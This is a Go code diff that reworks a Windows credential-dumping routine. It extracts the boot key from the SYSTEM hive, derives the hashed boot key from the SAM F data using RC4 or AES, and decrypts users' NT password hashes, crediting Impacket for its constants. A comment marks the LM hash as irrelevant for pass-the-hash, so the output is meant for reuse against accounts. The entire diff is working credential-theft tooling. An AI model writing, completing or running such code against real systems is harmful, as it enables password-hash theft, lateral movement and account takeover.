@@ -63,6 +63,7 @@ func ExtractBootKey(systemHive *Hive) ([]byte, error) {
 		return nil, fmt.Errorf("failed to extract full boot key (got %d bytes)", len(scrambledKey))
 	}
 
+
 	// Unscramble the boot key
 	// The key is stored in a specific permutation
 	transforms := []int{8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7}
@@ -73,17 +74,29 @@ func ExtractBootKey(systemHive *Hive) ([]byte, error) {
 		}
 	}
 
+
 	return bootKey, nil
 }
 
 // getKeyClass reads the class name from a key node
+// NK record structure (offsets from NK signature at cell+4):
+//
+//	NK+44 = cell+48: Security key offset
+//	NK+48 = cell+52: Class name offset (4 bytes)
+//	NK+72 = cell+76: Name length
+//	NK+74 = cell+78: Class name length (2 bytes)
+//	NK+76 = cell+80: Key name
 func (h *Hive) getKeyClass(keyOffset int) []byte {
-	if keyOffset+80 > len(h.data) {
+	if keyOffset+82 > len(h.data) {
 		return nil
 	}
 
-	classLen := binary.LittleEndian.Uint32(h.data[keyOffset+48 : keyOffset+52])
+	// keyOffset points to cell start (4-byte size field)
+	// NK signature is at keyOffset+4
+	// classOffset is at NK+48 = cell+52
 	classOff := binary.LittleEndian.Uint32(h.data[keyOffset+52 : keyOffset+56])
+	// classLen is at NK+74 = cell+78
+	classLen := binary.LittleEndian.Uint16(h.data[keyOffset+78 : keyOffset+80])
 
 	if classLen == 0 || classOff == 0xFFFFFFFF {
 		return nil
@@ -94,7 +107,20 @@ func (h *Hive) getKeyClass(keyOffset int) []byte {
 		return nil
 	}
 
-	return h.data[classAbs+4 : classAbs+4+int(classLen)]
+	// Class data is UTF-16LE encoded hex characters
+	classData := h.data[classAbs+4 : classAbs+4+int(classLen)]
+
+	// Convert UTF-16LE to ASCII hex string
+	hexStr := decodeUTF16LE(classData)
+
+	// Decode hex string to raw bytes
+	result, err := hex.DecodeString(hexStr)
+	if err != nil {
+		// If hex decode fails, return raw class data
+		return classData
+	}
+
+	return result
 }
 
 // ExtractSAMHashes extracts password hashes from SAM hive using boot key
@@ -147,80 +173,145 @@ func ExtractSAMHashes(samHive *Hive, bootKey []byte) ([]SAMHash, error) {
 }
 
 // deriveHashedBootKey derives the hashed boot key from domain F data
+// F data contains DOMAIN_ACCOUNT_F structure, Key0 at offset 0x68 (104 bytes)
 func deriveHashedBootKey(fData, bootKey []byte) ([]byte, error) {
-	if len(fData) < 0xA0 {
+	if len(fData) < 0x80 {
 		return nil, fmt.Errorf("F data too short")
 	}
 
-	// Check revision
-	revision := binary.LittleEndian.Uint32(fData[0:4])
+	// Key0 starts at offset 0x68 in DOMAIN_ACCOUNT_F (after 104 bytes of fixed fields)
+	// First byte of Key0 indicates the revision
+	key0Offset := 0x68
+	revision := fData[key0Offset]
 
-	if revision >= 3 {
+
+	if revision == 0x01 {
+		// RC4 encryption (older Windows)
+		return deriveHashedBootKeyRC4(fData, bootKey, key0Offset)
+	} else if revision == 0x02 {
 		// AES encryption (Windows 2016+)
-		return deriveHashedBootKeyAES(fData, bootKey)
+		return deriveHashedBootKeyAES(fData, bootKey, key0Offset)
 	}
 
-	// RC4 encryption (older Windows)
-	return deriveHashedBootKeyRC4(fData, bootKey)
+	return nil, fmt.Errorf("unknown F key revision: 0x%02x", revision)
 }
 
-func deriveHashedBootKeyRC4(fData, bootKey []byte) ([]byte, error) {
-	// F structure offset 0x70 contains the encrypted key
-	if len(fData) < 0x80 {
-		return nil, fmt.Errorf("F data too short for RC4")
+func deriveHashedBootKeyRC4(fData, bootKey []byte, key0Offset int) ([]byte, error) {
+	// SAM_KEY_DATA structure at key0Offset:
+	// 0: Revision (4 bytes)
+	// 4: Length (4 bytes)
+	// 8: Salt (16 bytes)
+	// 24: Key (16 bytes)
+	// 40: CheckSum (16 bytes)
+
+	if len(fData) < key0Offset+56 {
+		return nil, fmt.Errorf("F data too short for RC4 key data")
 	}
 
-	salt := fData[0x70:0x80]
-	encKey := fData[0x80:0xA0]
+	salt := fData[key0Offset+8 : key0Offset+24]
+	encKey := fData[key0Offset+24 : key0Offset+40]
+	checkSum := fData[key0Offset+40 : key0Offset+56]
 
-	// MD5(bootKey + salt + "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00")
-	qwerty := []byte("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00")
-	md5Hash := md5.New()
-	md5Hash.Write(bootKey)
-	md5Hash.Write(salt)
-	md5Hash.Write(qwerty)
-	rc4Key := md5Hash.Sum(nil)
+	// Constants from Impacket
+	QWERTY := []byte("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00")
+	DIGITS := []byte("0123456789012345678901234567890123456789\x00")
 
-	// Decrypt with RC4
-	cipher, _ := rc4.NewCipher(rc4Key)
-	decrypted := make([]byte, len(encKey))
-	cipher.XORKeyStream(decrypted, encKey)
+	// Derive RC4 key: MD5(Salt + QWERTY + bootKey + DIGITS)
+	h := md5.New()
+	h.Write(salt)
+	h.Write(QWERTY)
+	h.Write(bootKey)
+	h.Write(DIGITS)
+	rc4Key := h.Sum(nil)
 
-	return decrypted, nil
+	// Decrypt key + checksum
+	c, _ := rc4.NewCipher(rc4Key)
+	decrypted := make([]byte, 32)
+	combined := append(encKey, checkSum...)
+	c.XORKeyStream(decrypted, combined)
+
+	hashedBootKey := decrypted[:16]
+	decryptedCheckSum := decrypted[16:]
+
+	// Verify checksum: MD5(hashedBootKey + DIGITS + hashedBootKey + QWERTY)
+	h2 := md5.New()
+	h2.Write(hashedBootKey)
+	h2.Write(DIGITS)
+	h2.Write(hashedBootKey)
+	h2.Write(QWERTY)
+	expectedCheckSum := h2.Sum(nil)
+
+	if !bytesEqual(expectedCheckSum, decryptedCheckSum) {
+		// Continue anyway - might be syskey password protected
+	}
+
+	return hashedBootKey, nil
 }
 
-func deriveHashedBootKeyAES(fData, bootKey []byte) ([]byte, error) {
-	// For AES, the structure is different
-	if len(fData) < 0x88 {
-		return nil, fmt.Errorf("F data too short for AES")
+func deriveHashedBootKeyAES(fData, bootKey []byte, key0Offset int) ([]byte, error) {
+	// SAM_KEY_DATA_AES structure at key0Offset:
+	// 0: Revision (4 bytes)
+	// 4: Length (4 bytes)
+	// 8: CheckSumLen (4 bytes)
+	// 12: DataLen (4 bytes)
+	// 16: Salt (16 bytes)
+	// 32: Data (variable)
+
+	if len(fData) < key0Offset+32 {
+		return nil, fmt.Errorf("F data too short for AES header")
 	}
 
-	salt := fData[0x78:0x88]
-	encKey := fData[0x88:0xA8]
+	dataLen := binary.LittleEndian.Uint32(fData[key0Offset+12 : key0Offset+16])
+	salt := fData[key0Offset+16 : key0Offset+32]
 
-	// Derive decryption key
-	decKey := deriveAESKey(bootKey, salt)
+	if len(fData) < key0Offset+32+int(dataLen) {
+		return nil, fmt.Errorf("F data too short for AES data")
+	}
 
-	// Decrypt with AES-CBC
-	block, err := aes.NewCipher(decKey)
+	encData := fData[key0Offset+32 : key0Offset+32+int(dataLen)]
+
+
+	// Decrypt with AES-CBC using bootKey as key and salt as IV
+	// Use bootKey as-is (16 bytes)
+	if len(bootKey) < 16 {
+		return nil, fmt.Errorf("boot key too short")
+	}
+
+	block, err := aes.NewCipher(bootKey[:16])
 	if err != nil {
 		return nil, err
 	}
 
-	iv := make([]byte, 16) // Zero IV
-	mode := cipher.NewCBCDecrypter(block, iv)
-	decrypted := make([]byte, len(encKey))
-	mode.CryptBlocks(decrypted, encKey)
+	// Pad encrypted data if needed
+	encLen := len(encData)
+	if encLen%16 != 0 {
+		encLen = (encLen / 16) * 16
+	}
+	if encLen == 0 {
+		encLen = 16
+	}
+	paddedEnc := make([]byte, encLen)
+	copy(paddedEnc, encData)
 
+	mode := cipher.NewCBCDecrypter(block, salt)
+	decrypted := make([]byte, len(paddedEnc))
+	mode.CryptBlocks(decrypted, paddedEnc)
+
+
+	// Return first 16 bytes as hashed boot key
 	return decrypted[:16], nil
 }
 
-func deriveAESKey(bootKey, salt []byte) []byte {
-	// Simple key derivation
-	h := md5.New()
-	h.Write(bootKey)
-	h.Write(salt)
-	return h.Sum(nil)
+func bytesEqual(a, b []byte) bool {
+	if len(a) != len(b) {
+		return false
+	}
+	for i := range a {
+		if a[i] != b[i] {
+			return false
+		}
+	}
+	return true
 }
 
 // extractUserHash extracts LM and NT hashes from user V data
@@ -247,22 +338,15 @@ func extractUserHash(vData, hashedBootKey []byte, rid uint32) *SAMHash {
 		username = decodeUTF16LE(nameBytes)
 	}
 
-	lmOffset := binary.LittleEndian.Uint32(vData[0xA8:0xAC]) + 0xCC
-	lmLength := binary.LittleEndian.Uint32(vData[0xAC:0xB0])
-	ntOffset := binary.LittleEndian.Uint32(vData[0xB0:0xB4]) + 0xCC
-	ntLength := binary.LittleEndian.Uint32(vData[0xB4:0xB8])
+	// V structure: hash at 0xA8 is what we need for NT hash
+	// Modern Windows stores NT hash at what was historically the LM position
+	// 0xB0 is typically 0 (no separate NT hash location)
+	ntOffset := binary.LittleEndian.Uint32(vData[0xA8:0xAC]) + 0xCC
+	ntLength := binary.LittleEndian.Uint32(vData[0xAC:0xB0])
 
 	// Decrypt hashes
-	lmHash := "aad3b435b51404eeaad3b435b51404ee" // Empty LM hash
+	lmHash := "aad3b435b51404eeaad3b435b51404ee" // Empty LM hash (not used for PTH)
 	ntHash := "31d6cfe0d16ae931b73c59d7e0c089c0" // Empty NT hash
-
-	if lmLength >= 20 && int(lmOffset+lmLength) <= len(vData) {
-		encLM := vData[lmOffset : lmOffset+lmLength]
-		decLM := decryptHash(encLM, hashedBootKey, rid)
-		if len(decLM) == 16 {
-			lmHash = hex.EncodeToString(decLM)
-		}
-	}
 
 	if ntLength >= 20 && int(ntOffset+ntLength) <= len(vData) {
 		encNT := vData[ntOffset : ntOffset+ntLength]
@@ -330,38 +414,50 @@ func decryptHashRC4(encHash, hashedBootKey []byte, rid uint32) []byte {
 }
 
 func decryptHashAES(encHash, hashedBootKey []byte, rid uint32) []byte {
+	// SAM_HASH_AES structure:
+	// 0-1: PekID (2 bytes)
+	// 2-3: Revision (2 bytes)
+	// 4-7: DataOffset (4 bytes)
+	// 8-23: Salt (16 bytes)
+	// 24+: Hash (encrypted, if present)
+
+	// Minimum is 24 bytes (header only, no hash = empty)
 	if len(encHash) < 24 {
 		return nil
 	}
 
-	// Skip revision (2) + padding (2) + offset (4)
 	salt := encHash[8:24]
 	encrypted := encHash[24:]
 
+	// If no encrypted data after salt, return nil (empty hash)
 	if len(encrypted) < 16 {
 		return nil
 	}
 
-	// Derive AES key
-	ridBytes := make([]byte, 4)
-	binary.LittleEndian.PutUint32(ridBytes, rid)
+	// Use hashedBootKey[:16] directly as AES key, salt as IV (Impacket style)
+	if len(hashedBootKey) < 16 {
+		return nil
+	}
 
-	h := md5.New()
-	h.Write(hashedBootKey)
-	h.Write(salt)
-	h.Write(ridBytes)
-	aesKey := h.Sum(nil)
-
-	// Decrypt with AES-CBC
-	block, err := aes.NewCipher(aesKey)
+	block, err := aes.NewCipher(hashedBootKey[:16])
 	if err != nil {
 		return nil
 	}
 
-	iv := make([]byte, 16)
-	mode := cipher.NewCBCDecrypter(block, iv)
-	decrypted := make([]byte, len(encrypted))
-	mode.CryptBlocks(decrypted, encrypted)
+	// Pad to block size if needed
+	encLen := len(encrypted)
+	if encLen%16 != 0 {
+		encLen = (encLen / 16) * 16
+	}
+	if encLen < 16 {
+		encLen = 16
+	}
+	paddedEnc := make([]byte, encLen)
+	copy(paddedEnc, encrypted)
+
+	mode := cipher.NewCBCDecrypter(block, salt)
+	decrypted := make([]byte, len(paddedEnc))
+	mode.CryptBlocks(decrypted, paddedEnc)
 
 	if len(decrypted) < 16 {
 		return nil
